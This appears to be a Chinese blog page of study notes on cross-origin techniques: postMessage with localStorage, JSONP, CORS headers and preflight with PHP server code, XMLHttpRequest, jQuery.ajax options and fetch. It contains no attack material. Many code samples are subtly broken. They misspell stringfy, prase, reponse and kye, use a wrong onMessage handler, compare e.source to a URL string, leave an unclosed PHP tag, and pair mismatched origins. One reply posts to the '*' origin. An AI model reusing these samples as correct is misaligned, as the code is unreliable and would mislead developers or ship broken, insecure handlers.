<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 子: bbb.com ----&gt; 父: aaa.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// opener 是父窗口 </span></span><br><span class="line"><span class="comment">// window.opener: 父  http://aaa.com: 父</span></span><br><span class="line"><span class="built_in">window</span>.opener.postMessage(<span class="string">&#x27;hello, too&#x27;</span>, <span class="string">&#x27;http://aaa.com&#x27;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父子相互监听消息</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.data);</span><br><span class="line">  <span class="comment">// 回信息</span></span><br><span class="line">  e.source.postMessage(<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// event.source: 发送消息的窗口</span></span><br><span class="line"><span class="comment">// event.origin: 消息发向的网址</span></span><br><span class="line"><span class="comment">// event.data: 消息内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 我觉得实际可能不会用这种方法获取数据, 因为有很多来自四处的数据, 辨别比较麻烦, 或许可以在接收数据前验证以下 if(event.source == &#x27;目标 site&#x27;), 但是还是不够安全</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><span class="emoji" alias="boom" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4a5.png?v8">&#x1f4a5;</span></p>
<blockquote>
<p><code>localStorage</code> 与 <code>postMessage</code></p>
<blockquote>
</blockquote>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父让子 存数据</span></span><br><span class="line"><span class="keyword">var</span> win = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;iframe&#x27;</span>)[<span class="number">0</span>].contentWindow; <span class="comment">// contentWindow 是 HTMLIFrameElement 的 Window 对象</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">name</span>: <span class="string">&#x27;ly&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> data = <span class="built_in">JSON</span>.stringfy(&#123;<span class="attr">data</span>: obj, <span class="attr">kye</span>: <span class="string">&#x27;storage&#x27;</span>, <span class="attr">method</span>: <span class="string">&#x27;set&#x27;</span>&#125;);</span><br><span class="line">win.postMessage(data, <span class="string">&#x27;http://bbb.com&#x27;</span>);</span><br><span class="line"></span><br><span class="line">win.onMessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(e.source == <span class="string">&#x27;http://bbb.com&#x27;</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.prase(e.data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 子 存数据 / 返回父要的数据</span></span><br><span class="line"><span class="built_in">window</span>.onMessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(e.origin != <span class="string">&#x27;http://aaa.com&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">var</span> payload = <span class="built_in">JSON</span>.parse(e.data)</span><br><span class="line">  <span class="keyword">switch</span>(payload.data.method) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;set&#x27;</span>:</span><br><span class="line">      <span class="built_in">localStorage</span>.setItem(payload.key, <span class="built_in">JSON</span>.stringfy(payload.data));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">      <span class="keyword">var</span> parent = <span class="built_in">window</span>.parent;</span><br><span class="line">      <span class="keyword">var</span> data = <span class="built_in">localStorage</span>.getItem(payload.key)</span><br><span class="line">      parent.postMessage(<span class="built_in">JSON</span>.stringfy(data), <span class="string">&#x27;http://aaa.com&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><code>AJAX</code></li>
</ol>
<blockquote>
<p>同源政策: <code>AJAX</code> 请求只能发给同源的网址, 否则就报错</p>
<blockquote>
</blockquote>
<p>处于安全性考虑, 浏览器限制脚本内发起的跨源 <code>HTTP</code> 请求, 如 (<code>XMLHttpRequest</code> / <code>Fetch</code>), 即使用这些 API 的应用将只能从同一个域请求 <code>HTTP</code> 资源, 除非响应报文包含正确 <code>CORS</code> 响应头</p>
<blockquote>
</blockquote>
<p>解决: <code>架设服务器代理</code>: </p>
<blockquote>
<ol>
<li>浏览器 —&gt; 同源服务器; </li>
<li>同源服务器 —&gt; 目标网址; </li>
<li>目标网址 —&gt; 同源服务器; </li>
<li>同源服务器 —&gt; 浏览器</li>
</ol>
</blockquote>
<p>具体举措: <code>JSONP</code> | <code>WebSocket</code> | <code>CORS</code></p>
<blockquote>
</blockquote>
<p>现在解决了<strong>同源限制</strong>的问题, 问题转向获取数据了</p>
</blockquote>
<ul>
<li><p><code>JSONP</code> – 只支持 <code>get</code> 请求</p>
<ol>
<li><p>网页添加 <code>&lt;script&gt;</code> 元素, 这种方式不受 <strong>同源政策限制</strong>, 可以 <strong>跨域请求</strong></p>
</li>
<li><p>利用 <code>ajax</code> 封装后添加 <code>dataType</code> 属性为 <code>JSONP</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://api.foo.com?callback=bar&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>告诉服务器客户端有一个 <code>bar</code> 的回调函数, 你可以把数据通过参数的形式传过来哦</p>
</blockquote>
</li>
<li><p>服务器收到请求, 将 JSON 数据放在函数名, 作为字符串返回: <code>bar(&#123;...&#125;)</code></p>
</li>
<li><p>客户端将服务器返回的字符串, 作为代码解析出来, 因为浏览器认为这是 <code>&lt;script&gt;</code> 标签请求的脚本内容, 现在只要客户端定义了 <code>bar()</code> 函数, 就能拿到返回的 <code>JSON</code> 数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这一步很重要, 设置对待资源文件的方式</span></span><br><span class="line">  script.setAttribute(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/javascript&#x27;</span>);</span><br><span class="line">  script.src = <span class="string">&#x27;http://example.com/ip?callback=foo&#x27;</span>; <span class="comment">// 这里有个 callback</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 有个 foo 函数 获取数据</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(data);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 服务器将数据 plant 到函数的参数位置</span></span><br><span class="line">foo(&#123;</span><br><span class="line">  <span class="string">&#x27;ip&#x27;</span>: <span class="string">&#x27;5.5.5.5&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 作为参数的 JSON 数据被视为 Javascript 对象, 而不是字符串, 故而不用使用 parse</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><code>WebSocket</code> : 后续补充</p>
</li>
</ul>
<blockquote>
<p>通信协议, 不实行同源政策, 只要服务器支持, 就可以通过它进行跨源通信</p>
</blockquote>
<ul>
<li><code>CORS</code> — (<code>Cross-orign resource sharing</code>) 跨域资源共享<blockquote>
<p><code>CORS</code> 是一种基于 <code>HTTP</code> 头的机制, 该机制通过允许服务器标示除了它自己意外的其他 <code>orgin</code> (域 / 协议 / 端口), 这样浏览器可以<strong>访问其他域的资源</strong></p>
<blockquote>
</blockquote>
<p><code>CORS</code> 需要 浏览器 和 服务器 <strong>同时支持</strong>, 目前所有浏览器都支持</p>
<blockquote>
</blockquote>
<p>实现 <code>CORS</code> 通信的关键: 服务器实现 <code>CORS</code> 接口</p>
</blockquote>
</li>
</ul>
<ol>
<li>简单请求</li>
</ol>
<ul>
<li>请求方法是以下三种之一: <code>HEAD</code> | <code>GET</code> | <code>POST</code></li>
<li><code>HTTP</code> 的头信息不超出以下字段: <blockquote>
<p>Accept: 用户代理(可以理解为浏览器)期望的 MIME (文件扩展名, 可以理解为文件类型)类型列表<br>Accept-Language<br>Content-Language<br>Last-Event-ID<br>Content-Type(仅限 3 种): <code>application/x-www-form-urlencoded</code> | <code>multipart/form-data</code> | <code>text/plain</code></p>
</blockquote>
</li>
<li>请求中的任意 <code>XMLHttpRequestUpload</code> 对象未注册任何事件监听器</li>
</ul>
<blockquote>
<p>基本流程</p>
</blockquote>
<ol>
<li>浏览器发现跨域 <code>AJAX</code> 请求是简单请求, 自动在头信息中添加 <code>Origin</code> 字段<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">GET /cors HTTP/<span class="number">1.1</span></span><br><span class="line">Origin: http:<span class="comment">//api.bob.com  // 请求来自那个域</span></span><br><span class="line">Host: api.alice.com</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span>...</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span></span><br></pre></td></tr></table></figure></li>
<li>服务器根据 <code>Origin</code> 判断, 在许可范围内: 返回 <code>HTTP</code> 回应<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 要么是 origin 要么是 * , * 表示接收任意域名的请求</span></span><br><span class="line">Access-Control-Allow-Origin: http:<span class="comment">//api.bob.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选</span></span><br><span class="line"><span class="comment">// 是否允许发送 Cookie</span></span><br><span class="line"><span class="comment">// true: 浏览器可以把 Cookie 包含在请求中</span></span><br><span class="line">Access-Control-Allow-Credentials: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选</span></span><br><span class="line"><span class="comment">// CORS 请求时, XMLHttpRequest 对象通过 getResponseHeader() 获取一些信息, 基本字段有: Cache-Control / Content-Language / Content-Type / Expires / Last-Modified / Pragma, 如果想拿到其他字段, 就必须在 Acess-Control-Expose-Headers 里面指定</span></span><br><span class="line"><span class="comment">// 以下为例, 现在 getResponseHeader(&#x27;FooBar&#x27;) 就返回 FooBar 的值</span></span><br><span class="line">Access-Control-Expose-Headers: FooBar</span><br><span class="line"></span><br><span class="line">Content-Type: text/html; charset=utf-<span class="number">8</span></span><br></pre></td></tr></table></figure></li>
<li>不在许可范围内, <code>HTTP</code> 回应将不会有 <code>Acess-Control-Allow-Orgin</code> 字段, 抛错并被 <code>XMLHttpRequest</code> 的 <code>onerror</code> 回调函数捕获, 这种错误无法通过<strong>状态码</strong>识别, 因为 <code>HTTP</code> 回应状态码有可能是 <code>200</code></li>
<li>当然, 服务器设置 <code>Access-Control-Allow-Credentials: true</code> 时, 是为了让浏览器发送 <code>Cookie</code>, 同时开发者必须在 <code>AJAX</code> 请求中打开 <code>withCredentials</code> 属性: (如果响应中没有这条信息, 则响应的<strong>内容将不会返回</strong>给请求的发起者)<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 否则, 即使服务器要你发, 浏览器也不发</span></span><br><span class="line"><span class="comment">// 有些浏览器是默认为 true 的</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>此时 <code>Access-Control-Allow-Origin</code> 不能设置为 * , 而是请求网页的域名</p>
<blockquote>
</blockquote>
<p><code>Cookie</code> 遵循 同源政策, 只有服务器域名设置的 <code>Cookie</code> 才会上传, 其他不会( <code>CORS</code> 与 <code>Cookie</code> 是两码事, <code>CORS</code> 请求是跨域的, 但并不代表我的 <code>Cookie</code> 就可以随便给了, 这是为了安全)</p>
<blockquote>
</blockquote>
<p>还有要知道, <code>Cookie</code> 是浏览器的一个大集合, 并不是每一个网页独有一个 <code>Cookie</code></p>
</blockquote>
</li>
</ol>
<ol start="2">
<li><p>非简单请求</p>
<ul>
<li><code>预检请求</code><blockquote>
<ol>
<li>对服务器提出特殊要求的请求 <blockquote>
</blockquote>
</li>
<li>如 请求方法是 <code>PUT</code>, 或者 <code>Content-Type</code> 的类型是 <code>application/json</code><blockquote>
</blockquote>
</li>
<li>正式通信前, 增加一次 <code>HTTP</code> 查询请求 – 预检请求, <strong>询问</strong>当前网页的域名如果在服务器的<strong>许可名单</strong>内, 以及可以使用哪些 <code>HTTP</code> 方法和头信息字段<blockquote>
</blockquote>
</li>
<li>只有得到肯定答复, 才会发出正式的 <code>XMLHhttpRequest</code> 请求, 否则就报错</li>
</ol>
</blockquote>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;http://api.alice.com/cors&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;PUT&#x27;</span>, url, <span class="literal">true</span>); <span class="comment">// PUT 方法</span></span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;X-Custom-Header&#x27;</span>, <span class="string">&#x27;value&#x27;</span>); <span class="comment">// 自定义头信息</span></span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
<blockquote>
<p>浏览器检测到非简单请求, 在此之前先发出一个 预检 请求, 该请求的一些头部信息:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 预检 使用 OPTIONS 的请求方法</span></span><br><span class="line">OPTIONS /cors HTTP/<span class="number">1.1</span></span><br><span class="line">Origin: http:<span class="comment">//api.bob.com</span></span><br><span class="line">Access-Control-Request-Method: PUT</span><br><span class="line">Access-Control-Request-Headers: X-Custom-Header</span><br><span class="line">Host: api.alice.com</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span>...</span><br></pre></td></tr></table></figure>
<blockquote>
<p>确认允许跨域请求, 回应如下:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="built_in">Date</span>: Mon, <span class="number">01</span> Dec <span class="number">2008</span> <span class="number">01</span>:<span class="number">15</span>:<span class="number">39</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.0</span><span class="number">.61</span> (Unix)</span><br><span class="line"><span class="comment">// 允许该网站请求数据</span></span><br><span class="line"><span class="comment">// 为 * 则表示 任意网站都可以跨域请求</span></span><br><span class="line">Access-Control-Allow-Origin: http:<span class="comment">//api.bob.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回服务器支持的所有方法</span></span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line">Content-Type: text/html; charset=utf-<span class="number">8</span></span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line">Keep-Alive: timeout=<span class="number">2</span>, max=<span class="number">100</span></span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/plain</span><br></pre></td></tr></table></figure>
<blockquote>
<p>于是开始了正式的请求:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">PUT /cors HTTP/<span class="number">1.1</span></span><br><span class="line">Origin: http:<span class="comment">//api.bob.com</span></span><br><span class="line">Host: api.alice.com</span><br><span class="line">X-Custom-Header: value</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span>...</span><br></pre></td></tr></table></figure>
<blockquote>
<p>未通过 预检请求, 回应如下:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">OPTIONS http:<span class="comment">//api.bob.com HTTP/1.1</span></span><br><span class="line">Status: <span class="number">200</span></span><br><span class="line"><span class="comment">// 服务器明确指出不包括发出的请求的 http://api.bob.com</span></span><br><span class="line">Access-Control-Allow-Origin: https:<span class="comment">//notyourdomain.com</span></span><br><span class="line">Access-Control-Allow-Method: POST</span><br></pre></td></tr></table></figure>
<blockquote>
<p>浏览器会认定服务器不同意请求, 触发错误 <code>onerror</code></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">XMLHttpRequest cannot load http:<span class="comment">//api.alice.com.</span></span><br><span class="line">Origin http:<span class="comment">//api.bob.com is not allowed by Access-Control-Allow-Origin.</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>接下来看看服务器端的代码是如何处理这些请求的</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// 以 php 代码为例</span></span><br><span class="line">  <span class="comment">// 1. 只授予 a.com 域访问权限</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>] == <span class="string">&#x27;http://a.com&#x27;</span>) &#123;</span><br><span class="line">      header(<span class="string">&#x27;Access-Control-Allow-Origin: http://a.com&#x27;</span>);</span><br><span class="line">      header(<span class="string">&#x27;Content-type: application/xml&#x27;</span>);</span><br><span class="line">      readfile(<span class="string">&#x27;arunerDotNetResource.xml&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// other code</span></span><br><span class="line">    &#125;</span><br><span class="line">  &gt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2. 非简单请求</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;GET&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      header(<span class="string">&#x27;Content-Type: text/plain&#x27;</span>);</span><br><span class="line">      <span class="comment">// code here</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">elseif</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;OPTIONS&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 告诉客户端我们支持来自 a.com 的请求并且预请求有效期将仅有20天</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>] == <span class="string">&quot;http://arunranga.com&quot;</span>) &#123;</span><br><span class="line">      header(<span class="string">&#x27;Access-Control-Allow-Origin: http://a.com&#x27;</span>);</span><br><span class="line">      header(<span class="string">&#x27;Access-Control-Allow-Methods: POST, GET, OPTIONS&#x27;</span>);</span><br><span class="line">      header(<span class="string">&#x27;Access-Control-Allow-Headers: X-PINGARUNER&#x27;</span>); <span class="comment">// 可以附加这样的头信息</span></span><br><span class="line">      header(<span class="string">&#x27;Access-Control-Max-Age: 1728000&#x27;</span>);</span><br><span class="line">      header(<span class="string">&quot;Content-Length: 0&quot;</span>);</span><br><span class="line">      header(<span class="string">&quot;Content-Type: text/plain&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      header(<span class="string">&quot;HTTP/1.1 403 Access Forbidden&quot;</span>);</span><br><span class="line">      header(<span class="string">&quot;Content-Type: text/plain&quot;</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;You cannot repeat this request&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">elseif</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">/* 通过首先获得XML传送过来的blob来处理POST请求，然后做一些处理, 最后将结果返回客户端</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>] == <span class="string">&quot;http://a.com&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="variable">$postData</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">      <span class="variable">$document</span> = simplexml_load_string(<span class="variable">$postData</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 对POST过来的数据进行一些处理</span></span><br><span class="line">      <span class="variable">$ping</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_PINGARUNER&#x27;</span>];</span><br><span class="line"></span><br><span class="line">      header(<span class="string">&#x27;Access-Control-Allow-Origin: http://arunranga.com&#x27;</span>);</span><br><span class="line">      header(<span class="string">&#x27;Content-Type: text/plain&#x27;</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="comment">// 处理之后的一些响应</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;POSTing Only Allowed from arunranga.com&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;No Other Methods Allowed&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>总结:</p>
<blockquote>
<ol>
<li><code>JSONP</code> 只支持 <code>GET</code>, <code>CORS</code> 支持所有类型的 <code>HTTP</code> 请求  </li>
<li><code>JSONP</code> 支持老式浏览器, 以及可以向不支持 <code>CORS</code> 的网站请求数据</li>
</ol>
</blockquote>
</blockquote>
</li>
</ol>
<h4 id="Web-API"><a href="#Web-API" class="headerlink" title="Web API"></a><code>Web API</code></h4><h5 id="从服务器获取数据的-API"><a href="#从服务器获取数据的-API" class="headerlink" title="从服务器获取数据的 API"></a>从服务器获取数据的 <code>API</code></h5><blockquote>
<p>基本的 <code>Ajax</code> 请求: 局部更新</p>
<blockquote>
</blockquote>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 版本一</span></span><br><span class="line"><span class="keyword">const</span> testNode = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;pre&#x27;</span>);</span><br><span class="line">url = <span class="string">&#x27;something.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> request = <span class="keyword">new</span> XMLHttpRequest(); <span class="comment">// 创建新的请求对象</span></span><br><span class="line">request.open(<span class="string">&#x27;GET&#x27;</span>, url); <span class="comment">// 指定获取资源的方法和url</span></span><br><span class="line">request.reponseType = <span class="string">&#x27;text&#x27;</span>; <span class="comment">// 设置期待的响应类型, 默认返回文本</span></span><br><span class="line"></span><br><span class="line">request.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  testNode.textContent = request.reponse;</span><br><span class="line">&#125;</span><br><span class="line">request.send(); <span class="comment">// 发送请求</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>外: 使用 jquery 封装好的 ajax 版本 以及 各种参数的含义及使用</p>
<blockquote>
</blockquote>
</blockquote>
<h6 id="jQuery-ajax-url-settings-return-jqXHR"><a href="#jQuery-ajax-url-settings-return-jqXHR" class="headerlink" title="jQuery.ajax(url, [,settings]): return jqXHR"></a>jQuery.ajax(url, [,settings]): return jqXHR</h6><p>settings: {</p>
<ul>
<li>async: (Boolean)请求是否异步, 默认为 true – 异步</li>
<li>beforeSend: (Function(jqXHR, settings))<blockquote>
<ol>
<li>请求发送前的回调, 用来修改请求发送前的 <code>jqXHR</code>( <code>XMLHttpRequest</code> 对象), 用来设置自定义 <code>HTTP</code> 头信息</li>
<li>函数内返回 false 将取消这个请求</li>
</ol>
</blockquote>
</li>
<li>contentType: (String)<blockquote>
<ol>
<li>默认: <code>&#39;application/x-www-form-urlencoded; charset=UTF-8&#39;</code></li>
<li>发送信息至服务器时内容编码类型</li>
</ol>
</blockquote>
</li>
<li>crossDomain: (Boolean)<blockquote>
<p>向服务器端重定向到另一个域, 即向在同一域中前置跨域请求(如 JSONP 形式), 设置为 true</p>
</blockquote>
</li>
<li>data: (Object/String)<blockquote>
<ol>
<li>发送给服务器的数据, 将自动转换为请求字符串格式:</li>
<li>对象必须是{键: 值}格式, 如果参数是数组, 会转化为一个同名的多值查询字符串: {foo: [‘bar1’, ‘bar2’]} =&gt; ‘&amp;foo=bar1&amp;foo=bar2’</li>
</ol>
</blockquote>
</li>
<li>dataType: (String)<blockquote>
<ol>
<li>预期服务器返回的数据类型: xml / html / script / json / jsonp / text</li>
<li>不指定, 自动根据 HTTP 包 MIME 信息来决定</li>
<li>script: 把响应的结果当做 JavaScript 执行, 若不在同一域下, 所有 POST 请求都将转为 GET 请求, 因为将使用 DOM 的 script 标签来加载</li>
<li>json: 返回一个 JS 对象</li>
<li>jsonp: 会自动在所请求的 URL 最后添加 “?callback=?”</li>
</ol>
</blockquote>
</li>
<li>error: (Function(jqXHR jqXHR, String textStatus, String errorThrown))<blockquote>
<ol>
<li>失败调用回调</li>
<li>jqXHR(jQuery 1.4.x 前为 XMLHttpRequest), 描述发生错误类型, 捕获的异常对象</li>
</ol>
</blockquote>
</li>
<li>jsonp: 重写回调函数的名字 – 替代在 URL 中写 “callback=?” 这种 GET 或 POST 中请求的部分 – {jsonp: ‘onJsonPLoad’} 导致 ‘onJsonPload=?’ 传给服务器, 只是换了个名字, <strong>注意服务器可能就是根据 callback 来确定回调的, 不要轻易更改</strong></li>
<li>jsonpCallback: 为 jsonp 指定一个回调函数名, 与上 jsonp 合作 =&gt; {jsonp: false, jsonpCallback: ‘callbackName’}</li>
<li>processData: (Boolean) 默认(true), 默认将传入的 data <strong>处理转换为一个查询字符串</strong>, 配合 contentType, 如果要发送 DOM 树信息或其他 =&gt; false</li>
<li>statusCode: 一组数值的 HTTP 代码和函数对象, 响应时调用响应代码<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">  statusCode: &#123;</span><br><span class="line">    <span class="number">404</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      alert(<span class="string">&#x27;page not found&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>success: (Function(Object data, String textStatus, jqXHR jqXHR))<blockquote>
<ol>
<li>从服务器返回的数据, 根据 dataType 参数处理后的数据</li>
<li>描述状态</li>
<li>jqXHR 对象</li>
</ol>
</blockquote>
</li>
<li>type: GET(默认) / POST / PUT / DELETE</li>
<li>xhr: 回调创建 XMLHttpRequest 对象<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">  url: <span class="string">&#x27;https://baidu.com&#x27;</span>,</span><br><span class="line">  xhr: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="built_in">window</span>.XMLHttpRequest()</span><br><span class="line">    xhr.upload.onprogress = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// code here</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>$.ajax()</code> 返回它创建的 <code>XMLHttpRequest</code> 对象, 通常 <code>jQuery</code> 只在内部创建并处理这个对象, 但用户也可以通过 xhr 选项来传递一个自己创建的 xhr 对象 – <code>jQuery.ajaxSettings.xhr</code><br>}</p>
</blockquote>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 版本二: XHR 的现代替代品</span></span><br><span class="line"><span class="keyword">const</span> testNode = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;pre&#x27;</span>);</span><br><span class="line">url = <span class="string">&#x27;something.txt&#x27;</span>;</span><br><span class="line">fetch(url).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">  reponse.text().then(<span class="function"><span class="keyword">function</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">    testNode.textContent = text;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h5 id="用于绘制和操作图形的-API"><a href="#用于绘制和操作图形的-API" class="headerlink" title="用于绘制和操作图形的 API"></a>用于绘制和操作图形的 <code>API</code></h5><blockquote>
<p>使用 <code>&lt;canvas&gt;</code>: 在网页中创建 <code>2D</code> 或 <code>3D</code> 场景, 必须在 <code>HTML</code> 中插入 <code>&lt;canvas&gt;</code> 元素, 以界定网页中的绘图区域</p>
<blockquote>
</blockquote>
</blockquote>
